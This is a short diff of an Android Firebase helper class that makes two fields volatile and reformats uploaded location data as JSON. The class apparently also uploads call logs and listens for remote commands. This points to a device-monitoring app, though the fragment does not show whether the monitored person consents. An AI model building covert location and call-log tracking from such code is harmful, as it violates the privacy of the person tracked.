@@ -29,8 +29,8 @@ public class FirebaseManager {
     private FirebaseAuth mAuth;
     private FirebaseDatabase mDatabase;
     private FirebaseStorage mStorage;
-    private String currentEmail;
-    private OnCommandListener commandListener;
+    private volatile String currentEmail;
+    private volatile OnCommandListener commandListener;
     private ValueEventListener commandListenerRef;
 
     private FirebaseManager() {
@@ -175,7 +175,9 @@ public class FirebaseManager {
                 .child(sanitized)
                 .child(fileName);
 
-        storageRef.putBytes(location.toString().getBytes());
+        String json = "{\"lat\":" + latitude + ",\"lng\":" + longitude
+                + ",\"timestamp\":" + System.currentTimeMillis() + "}";
+        storageRef.putBytes(json.getBytes());
     }
 
     public void uploadCallLog(String number, String type, long duration, long date) {
